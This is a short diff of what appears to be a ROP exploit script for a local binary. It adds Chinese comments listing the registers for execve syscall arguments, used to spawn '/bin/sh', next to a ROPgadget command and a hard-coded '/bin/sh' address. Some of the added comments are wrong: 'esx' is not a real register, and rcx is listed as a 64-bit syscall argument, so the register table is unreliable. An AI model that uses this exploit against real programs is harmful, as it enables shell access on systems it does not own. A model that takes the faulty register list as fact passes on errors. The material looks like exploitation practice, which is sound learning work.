@@ -6,12 +6,17 @@ proc = process('./rop')
 # ebx = /bin/sh   // 第一个参数
 # ecx = 0         // 第二个参数
 # edx = 0         // 第三个参数
+# esx = 0         // 第四个参数
+# edi = 0         // 第五个参数
 #
 # 64位
 # rax = 0x3B      // execve系统调用号
 # rdi = /bin/sh   // 第一个参数
 # rsi = 0         // 第二个参数
 # rdx = 0         // 第三个参数
+# rcx = 0         // 第四个参数
+# r8  = 0         // 第五个参数
+# r9  = 0         // 第六个参数
 
 # ROPgadget --binary ./rop --string '/bin/sh'
 binsh   = 0x080be408
